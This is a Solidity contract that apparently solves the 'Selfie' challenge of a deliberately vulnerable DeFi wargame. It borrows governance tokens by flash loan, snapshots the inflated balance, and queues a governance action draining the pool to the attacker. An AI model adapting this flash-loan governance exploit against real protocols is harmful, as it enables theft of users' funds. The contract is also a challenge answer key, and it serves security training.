pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";

contract SelfieAttack {

    DamnValuableTokenSnapshot token;
    SelfiePool pool;
    SimpleGovernance governance;

    constructor(address _token, address _pool, address _governance) {
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
    }

    function propose() public {
        // need a loan of more than half total supply
        pool.flashLoan(1000001 ether);
    }

    function receiveTokens(address _token, uint256 amount) public {
        require(_token == address(token));
        token.snapshot(); // take a snapshot showing enough balance for proposal
        governance.queueAction(
            address(pool), // receiver
            abi.encodeWithSignature("drainAllFunds(address)", tx.origin),
            0);
        token.transfer(address(pool), token.balanceOf(address(this)));
    }

}
